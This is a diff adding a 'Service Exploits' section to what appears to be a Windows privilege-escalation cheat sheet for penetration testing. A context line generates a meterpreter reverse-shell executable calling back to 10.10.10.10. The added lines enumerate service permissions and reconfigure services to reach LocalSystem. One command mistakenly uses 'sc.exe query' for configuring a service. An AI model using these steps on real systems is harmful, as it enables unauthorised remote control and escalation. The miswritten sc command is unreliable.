@@ -10,3 +10,33 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f ex
 ```
 
 Also use the meterpreter command `getsystem`
+
+## Service Exploits
+See what users are available
+```cmd
+> net user
+```
+
+[Here](https://docs.microsoft.com/en-us/windows/win32/services/service-user-accounts) are service users. 99.9% of the time you want LocalSystem.
+
+See what write permissions you have for all services using [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+```cmd
+> accesschk.exe /accepteula -uwcqv <user> *
+```
+
+Query the configuration of a service
+```cmd
+> sc.exe qc <name>
+```
+Query the current status of a service
+```cmd
+> sc.exe query <name>
+```
+Modify a configuration option of a service. Here are a list of [options/values](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
+```cmd
+> sc.exe query <name> <option>= <value>
+```
+Start/stop services
+```cmd
+> net start/stop <name>
+```
